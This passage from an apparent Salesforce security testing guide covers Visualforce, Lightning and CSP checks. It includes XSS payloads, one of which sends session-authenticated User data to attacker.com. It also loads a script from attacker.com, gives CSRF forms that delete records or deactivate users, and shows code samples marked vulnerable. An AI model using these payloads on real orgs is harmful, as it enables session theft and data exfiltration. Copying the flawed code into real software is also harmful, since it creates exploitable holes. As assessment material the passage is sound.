</span></code></pre></div></p>
<p><strong>XSS Testing Payloads</strong>:
<div class="language-html highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a><span class="cm">&lt;!-- Basic XSS payload --&gt;</span>
</span><span id="__span-37-2"><a id="__codelineno-37-2" name="__codelineno-37-2" href="#__codelineno-37-2"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span><span class="nx">alert</span><span class="p">(</span><span class="s1">&#39;XSS&#39;</span><span class="p">)&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-37-3"><a id="__codelineno-37-3" name="__codelineno-37-3" href="#__codelineno-37-3"></a>
</span><span id="__span-37-4"><a id="__codelineno-37-4" name="__codelineno-37-4" href="#__codelineno-37-4"></a><span class="cm">&lt;!-- Event handler XSS --&gt;</span>
</span><span id="__span-37-5"><a id="__codelineno-37-5" name="__codelineno-37-5" href="#__codelineno-37-5"></a><span class="p">&lt;</span><span class="nt">img</span> <span class="na">src</span><span class="o">=</span><span class="s">&quot;x&quot;</span> <span class="na">onerror</span><span class="o">=</span><span class="s">&quot;alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>
</span><span id="__span-37-6"><a id="__codelineno-37-6" name="__codelineno-37-6" href="#__codelineno-37-6"></a>
</span><span id="__span-37-7"><a id="__codelineno-37-7" name="__codelineno-37-7" href="#__codelineno-37-7"></a><span class="cm">&lt;!-- JavaScript protocol --&gt;</span>
</span><span id="__span-37-8"><a id="__codelineno-37-8" name="__codelineno-37-8" href="#__codelineno-37-8"></a><span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;javascript:alert(&#39;XSS&#39;)&quot;</span><span class="p">&gt;</span>Click<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
</span><span id="__span-37-9"><a id="__codelineno-37-9" name="__codelineno-37-9" href="#__codelineno-37-9"></a>
</span><span id="__span-37-10"><a id="__codelineno-37-10" name="__codelineno-37-10" href="#__codelineno-37-10"></a><span class="cm">&lt;!-- Advanced payload for data extraction --&gt;</span>
</span><span id="__span-37-11"><a id="__codelineno-37-11" name="__codelineno-37-11" href="#__codelineno-37-11"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-37-12"><a id="__codelineno-37-12" name="__codelineno-37-12" href="#__codelineno-37-12"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/services/data/v52.0/sobjects/User/&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-37-13"><a id="__codelineno-37-13" name="__codelineno-37-13" href="#__codelineno-37-13"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;Authorization&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;Bearer &#39;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s1">&#39;{!$Api.Session_ID}&#39;</span><span class="p">}</span>
</span><span id="__span-37-14"><a id="__codelineno-37-14" name="__codelineno-37-14" href="#__codelineno-37-14"></a><span class="p">}).</span><span class="nx">then</span><span class="p">(</span><span class="nx">r</span><span class="p">=&gt;</span><span class="nx">r</span><span class="p">.</span><span class="nx">json</span><span class="p">()).</span><span class="nx">then</span><span class="p">(</span><span class="nx">d</span><span class="p">=&gt;</span><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://attacker.com/exfil?data=&#39;</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nb">JSON</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">d</span><span class="p">))));</span>
</span><span id="__span-37-15"><a id="__codelineno-37-15" name="__codelineno-37-15" href="#__codelineno-37-15"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-37-16"><a id="__codelineno-37-16" name="__codelineno-37-16" href="#__codelineno-37-16"></a>
</span><span id="__span-37-17"><a id="__codelineno-37-17" name="__codelineno-37-17" href="#__codelineno-37-17"></a><span class="cm">&lt;!-- SVG-based XSS --&gt;</span>
</span><span id="__span-37-18"><a id="__codelineno-37-18" name="__codelineno-37-18" href="#__codelineno-37-18"></a><span class="p">&lt;</span><span class="nt">svg</span><span class="err">/</span><span class="na">onload</span><span class="o">=</span><span class="s">alert(document.domain)</span><span class="p">&gt;</span>
</span><span id="__span-37-19"><a id="__codelineno-37-19" name="__codelineno-37-19" href="#__codelineno-37-19"></a>
</span><span id="__span-37-20"><a id="__codelineno-37-20" name="__codelineno-37-20" href="#__codelineno-37-20"></a><span class="cm">&lt;!-- Style-based XSS --&gt;</span>
</span><span id="__span-37-21"><a id="__codelineno-37-21" name="__codelineno-37-21" href="#__codelineno-37-21"></a><span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&quot;animation-name:rotation&quot;</span> <span class="na">onanimationstart</span><span class="o">=</span><span class="s">&quot;alert(1)&quot;</span> <span class="na">x</span><span class="o">=</span><span class="s">&quot;&quot;</span><span class="p">&gt;</span>
</span></code></pre></div></p>
<p><strong>CSRF Vulnerability Testing</strong>:
<div class="language-html highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="cm">&lt;!-- Test CSRF protection --&gt;</span>
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;/apex/VulnerablePage&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;action&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;deleteRecord&quot;</span><span class="p">&gt;</span>
</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;hidden&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;recordId&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;001XX000003DHPt&quot;</span><span class="p">&gt;</span>
</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a>    <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;Delete Account&quot;</span><span class="p">&gt;</span>
</span><span id="__span-38-6"><a id="__codelineno-38-6" name="__codelineno-38-6" href="#__codelineno-38-6"></a><span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
</span><span id="__span-38-7"><a id="__codelineno-38-7" name="__codelineno-38-7" href="#__codelineno-38-7"></a>
</span><span id="__span-38-8"><a id="__codelineno-38-8" name="__codelineno-38-8" href="#__codelineno-38-8"></a><span class="cm">&lt;!-- Advanced CSRF with AJAX --&gt;</span>
</span><span id="__span-38-9"><a id="__codelineno-38-9" name="__codelineno-38-9" href="#__codelineno-38-9"></a><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
</span><span id="__span-38-10"><a id="__codelineno-38-10" name="__codelineno-38-10" href="#__codelineno-38-10"></a><span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;/apex/VulnerablePage&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-38-11"><a id="__codelineno-38-11" name="__codelineno-38-11" href="#__codelineno-38-11"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;POST&#39;</span><span class="p">,</span>
</span><span id="__span-38-12"><a id="__codelineno-38-12" name="__codelineno-38-12" href="#__codelineno-38-12"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">&#39;Content-Type&#39;</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;application/x-www-form-urlencoded&#39;</span><span class="p">},</span>
</span><span id="__span-38-13"><a id="__codelineno-38-13" name="__codelineno-38-13" href="#__codelineno-38-13"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="s1">&#39;action=modifyUser&amp;userId=005XX000001b0Qw&amp;isActive=false&#39;</span>
</span><span id="__span-38-14"><a id="__codelineno-38-14" name="__codelineno-38-14" href="#__codelineno-38-14"></a><span class="p">});</span>
</span><span id="__span-38-15"><a id="__codelineno-38-15" name="__codelineno-38-15" href="#__codelineno-38-15"></a><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
</span></code></pre></div></p>
<p><strong>Information Disclosure Assessment</strong>:
<div class="language-html highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a><span class="cm">&lt;!-- Check for sensitive data exposure --&gt;</span>
</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a><span class="p">&lt;</span><span class="nt">apex:page</span> <span class="na">showHeader</span><span class="o">=</span><span class="s">&quot;false&quot;</span><span class="p">&gt;</span>
</span><span id="__span-39-3"><a id="__codelineno-39-3" name="__codelineno-39-3" href="#__codelineno-39-3"></a>    Session ID: {!$Api.Session_ID}
</span><span id="__span-39-4"><a id="__codelineno-39-4" name="__codelineno-39-4" href="#__codelineno-39-4"></a>    User ID: {!$User.Id}
</span><span id="__span-39-5"><a id="__codelineno-39-5" name="__codelineno-39-5" href="#__codelineno-39-5"></a>    Organization ID: {!$Organization.Id}
</span><span id="__span-39-6"><a id="__codelineno-39-6" name="__codelineno-39-6" href="#__codelineno-39-6"></a>
</span><span id="__span-39-7"><a id="__codelineno-39-7" name="__codelineno-39-7" href="#__codelineno-39-7"></a>    <span class="cm">&lt;!-- Debug information exposure --&gt;</span>
</span><span id="__span-39-8"><a id="__codelineno-39-8" name="__codelineno-39-8" href="#__codelineno-39-8"></a>    <span class="p">&lt;</span><span class="nt">apex:pageMessages</span> <span class="p">/&gt;</span>
</span><span id="__span-39-9"><a id="__codelineno-39-9" name="__codelineno-39-9" href="#__codelineno-39-9"></a>
</span><span id="__span-39-10"><a id="__codelineno-39-10" name="__codelineno-39-10" href="#__codelineno-39-10"></a>    <span class="cm">&lt;!-- Server-side debugging --&gt;</span>
</span><span id="__span-39-11"><a id="__codelineno-39-11" name="__codelineno-39-11" href="#__codelineno-39-11"></a>    <span class="p">&lt;</span><span class="nt">apex:outputText</span> <span class="na">value</span><span class="o">=</span><span class="s">&quot;{!debugInfo}&quot;</span> <span class="na">escape</span><span class="o">=</span><span class="s">&quot;false&quot;</span><span class="p">/&gt;</span>
</span><span id="__span-39-12"><a id="__codelineno-39-12" name="__codelineno-39-12" href="#__codelineno-39-12"></a><span class="p">&lt;/</span><span class="nt">apex:page</span><span class="p">&gt;</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Session hijacking, credential theft, unauthorized actions.</p>
<h3 id="4-lightning-component-security">4. Lightning Component Security</h3>
<p><strong>Objective</strong>: Assess Lightning component security and client-side vulnerabilities.</p>
<p><strong>Component Discovery</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a><span class="c1">-- Lightning Web Components</span>
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">DeveloperName</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span><span class="k">Source</span>
</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a><span class="k">FROM</span><span class="w"> </span><span class="n">LightningComponentBundle</span><span class="w"> </span>
</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">IsDeleted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">false</span>
</span><span id="__span-40-5"><a id="__codelineno-40-5" name="__codelineno-40-5" href="#__codelineno-40-5"></a>
</span><span id="__span-40-6"><a id="__codelineno-40-6" name="__codelineno-40-6" href="#__codelineno-40-6"></a><span class="c1">-- Aura Components  </span>
</span><span id="__span-40-7"><a id="__codelineno-40-7" name="__codelineno-40-7" href="#__codelineno-40-7"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">DeveloperName</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span><span class="k">Source</span>
</span><span id="__span-40-8"><a id="__codelineno-40-8" name="__codelineno-40-8" href="#__codelineno-40-8"></a><span class="k">FROM</span><span class="w"> </span><span class="n">AuraDefinitionBundle</span><span class="w"> </span>
</span><span id="__span-40-9"><a id="__codelineno-40-9" name="__codelineno-40-9" href="#__codelineno-40-9"></a><span class="k">WHERE</span><span class="w"> </span><span class="n">IsDeleted</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">false</span>
</span></code></pre></div></p>
<p><strong>Client-Side Vulnerabilities</strong>:
<div class="language-javascript highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a><span class="c1">// VULNERABLE: Exposing sensitive data in component events</span>
</span><span id="__span-41-2"><a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a><span class="p">({</span>
</span><span id="__span-41-3"><a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a><span class="w">    </span><span class="nx">sendData</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">component</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">,</span><span class="w"> </span><span class="nx">helper</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-41-4"><a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a><span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">sensitiveData</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">component</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&quot;v.sessionId&quot;</span><span class="p">);</span>
</span><span id="__span-41-5"><a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a><span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">evt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">$A</span><span class="p">.</span><span class="nx">get</span><span class="p">(</span><span class="s2">&quot;e.c:DataEvent&quot;</span><span class="p">);</span>
</span><span id="__span-41-6"><a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a><span class="w">        </span><span class="nx">evt</span><span class="p">.</span><span class="nx">setParams</span><span class="p">({</span>
</span><span id="__span-41-7"><a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a><span class="w">            </span><span class="s2">&quot;data&quot;</span><span class="o">:</span><span class="w"> </span><span class="nx">sensitiveData</span><span class="w"> </span><span class="c1">// Sensitive data in event</span>
</span><span id="__span-41-8"><a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a><span class="w">        </span><span class="p">});</span>
</span><span id="__span-41-9"><a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a><span class="w">        </span><span class="nx">evt</span><span class="p">.</span><span class="nx">fire</span><span class="p">();</span>
</span><span id="__span-41-10"><a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-41-11"><a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a><span class="p">})</span>
</span><span id="__span-41-12"><a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a>
</span><span id="__span-41-13"><a id="__codelineno-41-13" name="__codelineno-41-13" href="#__codelineno-41-13"></a><span class="c1">// VULNERABLE: Client-side validation only</span>
</span><span id="__span-41-14"><a id="__codelineno-41-14" name="__codelineno-41-14" href="#__codelineno-41-14"></a><span class="p">({</span>
</span><span id="__span-41-15"><a id="__codelineno-41-15" name="__codelineno-41-15" href="#__codelineno-41-15"></a><span class="w">    </span><span class="nx">validateInput</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">component</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">,</span><span class="w"> </span><span class="nx">helper</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-41-16"><a id="__codelineno-41-16" name="__codelineno-41-16" href="#__codelineno-41-16"></a><span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">isValid</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">;</span><span class="w"> </span><span class="c1">// Client-side only validation</span>
</span><span id="__span-41-17"><a id="__codelineno-41-17" name="__codelineno-41-17" href="#__codelineno-41-17"></a><span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">isValid</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-41-18"><a id="__codelineno-41-18" name="__codelineno-41-18" href="#__codelineno-41-18"></a><span class="w">            </span><span class="nx">helper</span><span class="p">.</span><span class="nx">performSensitiveAction</span><span class="p">(</span><span class="nx">component</span><span class="p">);</span>
</span><span id="__span-41-19"><a id="__codelineno-41-19" name="__codelineno-41-19" href="#__codelineno-41-19"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-41-20"><a id="__codelineno-41-20" name="__codelineno-41-20" href="#__codelineno-41-20"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-41-21"><a id="__codelineno-41-21" name="__codelineno-41-21" href="#__codelineno-41-21"></a><span class="p">})</span>
</span><span id="__span-41-22"><a id="__codelineno-41-22" name="__codelineno-41-22" href="#__codelineno-41-22"></a>
</span><span id="__span-41-23"><a id="__codelineno-41-23" name="__codelineno-41-23" href="#__codelineno-41-23"></a><span class="c1">// VULNERABLE: Unsafe DOM manipulation</span>
</span><span id="__span-41-24"><a id="__codelineno-41-24" name="__codelineno-41-24" href="#__codelineno-41-24"></a><span class="p">({</span>
</span><span id="__span-41-25"><a id="__codelineno-41-25" name="__codelineno-41-25" href="#__codelineno-41-25"></a><span class="w">    </span><span class="nx">updateContent</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">component</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">,</span><span class="w"> </span><span class="nx">helper</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-41-26"><a id="__codelineno-41-26" name="__codelineno-41-26" href="#__codelineno-41-26"></a><span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">userInput</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">event</span><span class="p">.</span><span class="nx">getParam</span><span class="p">(</span><span class="s1">&#39;input&#39;</span><span class="p">);</span>
</span><span id="__span-41-27"><a id="__codelineno-41-27" name="__codelineno-41-27" href="#__codelineno-41-27"></a><span class="w">        </span><span class="kd">var</span><span class="w"> </span><span class="nx">element</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">component</span><span class="p">.</span><span class="nx">find</span><span class="p">(</span><span class="s2">&quot;content&quot;</span><span class="p">).</span><span class="nx">getElement</span><span class="p">();</span>
</span><span id="__span-41-28"><a id="__codelineno-41-28" name="__codelineno-41-28" href="#__codelineno-41-28"></a><span class="w">        </span><span class="nx">element</span><span class="p">.</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">userInput</span><span class="p">;</span><span class="w"> </span><span class="c1">// XSS risk</span>
</span><span id="__span-41-29"><a id="__codelineno-41-29" name="__codelineno-41-29" href="#__codelineno-41-29"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-41-30"><a id="__codelineno-41-30" name="__codelineno-41-30" href="#__codelineno-41-30"></a><span class="p">})</span>
</span></code></pre></div></p>
<p><strong>Content Security Policy Testing</strong>:
<div class="language-javascript highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a><span class="c1">// Test CSP bypass attempts</span>
</span><span id="__span-42-2"><a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a><span class="k">try</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-42-3"><a id="__codelineno-42-3" name="__codelineno-42-3" href="#__codelineno-42-3"></a><span class="w">    </span><span class="nb">eval</span><span class="p">(</span><span class="s1">&#39;alert(&quot;CSP Bypass&quot;)&#39;</span><span class="p">);</span>
</span><span id="__span-42-4"><a id="__codelineno-42-4" name="__codelineno-42-4" href="#__codelineno-42-4"></a><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-42-5"><a id="__codelineno-42-5" name="__codelineno-42-5" href="#__codelineno-42-5"></a><span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;CSP blocking eval&#39;</span><span class="p">);</span>
</span><span id="__span-42-6"><a id="__codelineno-42-6" name="__codelineno-42-6" href="#__codelineno-42-6"></a><span class="p">}</span>
</span><span id="__span-42-7"><a id="__codelineno-42-7" name="__codelineno-42-7" href="#__codelineno-42-7"></a>
</span><span id="__span-42-8"><a id="__codelineno-42-8" name="__codelineno-42-8" href="#__codelineno-42-8"></a><span class="c1">// Test unsafe-inline script execution</span>
</span><span id="__span-42-9"><a id="__codelineno-42-9" name="__codelineno-42-9" href="#__codelineno-42-9"></a><span class="nb">document</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s1">&#39;&lt;script&gt;alert(&quot;Inline script&quot;)&lt;/script&gt;&#39;</span><span class="p">;</span>
</span><span id="__span-42-10"><a id="__codelineno-42-10" name="__codelineno-42-10" href="#__codelineno-42-10"></a>
</span><span id="__span-42-11"><a id="__codelineno-42-11" name="__codelineno-42-11" href="#__codelineno-42-11"></a><span class="c1">// Test external resource loading</span>
</span><span id="__span-42-12"><a id="__codelineno-42-12" name="__codelineno-42-12" href="#__codelineno-42-12"></a><span class="kd">var</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="s1">&#39;script&#39;</span><span class="p">);</span>
</span><span id="__span-42-13"><a id="__codelineno-42-13" name="__codelineno-42-13" href="#__codelineno-42-13"></a><span class="nx">script</span><span class="p">.</span><span class="nx">src</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;https://attacker.com/malicious.js&#39;</span><span class="p">;</span>
</span><span id="__span-42-14"><a id="__codelineno-42-14" name="__codelineno-42-14" href="#__codelineno-42-14"></a><span class="nb">document</span><span class="p">.</span><span class="nx">head</span><span class="p">.</span><span class="nx">appendChild</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
</span></code></pre></div></p>
<p><strong>Lightning Locker Service Assessment</strong>:
<div class="language-javascript highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a><span class="c1">// Test Locker Service restrictions</span>
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a><span class="p">({</span>
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a><span class="w">    </span><span class="nx">testLockerService</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">component</span><span class="p">,</span><span class="w"> </span><span class="nx">event</span><span class="p">,</span><span class="w"> </span><span class="nx">helper</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-43-5"><a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a><span class="w">            </span><span class="c1">// Attempt DOM manipulation outside component</span>
</span><span id="__span-43-6"><a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a><span class="w">            </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;external-element&#39;</span><span class="p">).</span><span class="nx">innerHTML</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;Modified&#39;</span><span class="p">;</span>
</span><span id="__span-43-7"><a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-43-8"><a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a><span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Locker Service blocking DOM access&#39;</span><span class="p">);</span>
</span><span id="__span-43-9"><a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-43-10"><a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a>
</span><span id="__span-43-11"><a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a><span class="w">        </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-43-12"><a id="__codelineno-43-12" name="__codelineno-43-12" href="#__codelineno-43-12"></a><span class="w">            </span><span class="c1">// Attempt global variable access</span>
</span><span id="__span-43-13"><a id="__codelineno-43-13" name="__codelineno-43-13" href="#__codelineno-43-13"></a><span class="w">            </span><span class="nb">window</span><span class="p">.</span><span class="nx">sensitiveGlobalVar</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;compromised&#39;</span><span class="p">;</span>
</span><span id="__span-43-14"><a id="__codelineno-43-14" name="__codelineno-43-14" href="#__codelineno-43-14"></a><span class="w">        </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
</span><span id="__span-43-15"><a id="__codelineno-43-15" name="__codelineno-43-15" href="#__codelineno-43-15"></a><span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Locker Service blocking global access&#39;</span><span class="p">);</span>
</span><span id="__span-43-16"><a id="__codelineno-43-16" name="__codelineno-43-16" href="#__codelineno-43-16"></a><span class="w">        </span><span class="p">}</span>
</span><span id="__span-43-17"><a id="__codelineno-43-17" name="__codelineno-43-17" href="#__codelineno-43-17"></a><span class="w">    </span><span class="p">}</span>
</span><span id="__span-43-18"><a id="__codelineno-43-18" name="__codelineno-43-18" href="#__codelineno-43-18"></a><span class="p">})</span>
</span></code></pre></div></p>
<p><strong>Impact</strong>: Client-side code execution, component manipulation, data exposure.</p>
<hr />
<h2 id="platform-configuration-security">Platform Configuration Security</h2>
<h3 id="1-critical-security-settings-audit">1. Critical Security Settings Audit</h3>
<p><strong>Objective</strong>: Review platform-wide security configurations for misconfigurations.</p>
<p><strong>Network Security Configuration</strong>:
<div class="language-sql highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a><span class="c1">-- IP restrictions analysis</span>
</span><span id="__span-44-2"><a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a><span class="k">SELECT</span><span class="w"> </span><span class="n">Id</span><span class="p">,</span><span class="w"> </span><span class="n">IpAddress</span><span class="p">,</span><span class="w"> </span><span class="n">IpAddressMask</span><span class="p">,</span><span class="w"> </span><span class="n">Description</span><span class="p">,</span><span class="w"> </span><span class="n">CreatedDate</span>
</span><span id="__span-44-3"><a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a><span class="k">FROM</span><span class="w"> </span><span class="n">IpRestriction</span><span class="w"> </span>
</span><span id="__span-44-4"><a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a><span class="k">ORDER</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="n">CreatedDate</span><span class="w"> </span><span class="k">DESC</span>
</span><span id="__span-44-5"><a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>
</span><span id="__span-44-6"><a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a><span class="c1">-- Login IP ranges by profile</span>
